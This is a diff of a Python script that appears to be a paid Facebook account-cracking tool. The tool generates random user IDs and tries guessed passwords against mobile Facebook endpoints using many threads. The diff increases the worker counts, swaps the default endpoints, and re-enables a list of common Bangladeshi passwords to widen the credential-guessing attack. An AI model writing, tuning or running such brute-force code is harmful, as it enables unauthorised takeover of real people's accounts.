@@ -1,9 +1,9 @@
 import os, sys, uuid, re, random, time, string, json,base64
 from io import BytesIO
 try:
-	
-	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-	import requests, rich,certifi,pycurl
+    
+    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+    import requests, rich,certifi,pycurl
 except:
     os.system("git pull")
     
@@ -126,7 +126,7 @@ for brand in range(1000):
     d= str(random.randint(10,20))
     abc = a+b+c
     if not os.path.exists('device_info.txt'):
-    	 info()
+         info()
     else:
         infos = open('device_info.txt', 'r').read()
         version_, model_, brand_name_, width_, height_ = infos.split('$')
@@ -462,7 +462,7 @@ def ran():
     print(sort.line())
     meth = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
     if meth in ["1", "a", "A"]:
-        fb = "mbasic"
+        fb = "m"
     elif meth in ["2", "b", "B"]:
         fb = "x"
     elif meth in ["3", "c", "C"]:
@@ -472,11 +472,11 @@ def ran():
     elif meth in ["5", "e", "E"]:
         fb = "free"
     else:
-        fb = "m"
+        fb = "mbasic"
     if meth in ["1", "a", "A"]:
-    	mw = 30
+        mw = 90
     else:
-    	mw = 90
+        mw = 50
     with ThreadPool(max_workers=mw) as heron:
         sort.clear()
         sort.logo()
@@ -488,7 +488,7 @@ def ran():
             if ask in ["1", "01", "a", "A"]:
                 pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[1:]]
             else:
-                pwx = [uid, uid[:6], uid[:8], xd[4], xd[2:]]   # , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
+                pwx = [uid, uid[:6], uid[:8], xd[4], xd[2:] , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
@@ -665,7 +665,7 @@ def approve():
         sys.exit("[!!] Internet Error...")
     
     if showkey in datax:
-    	
+        
         print("Checking Subscription")
         time.sleep(3)
         main()
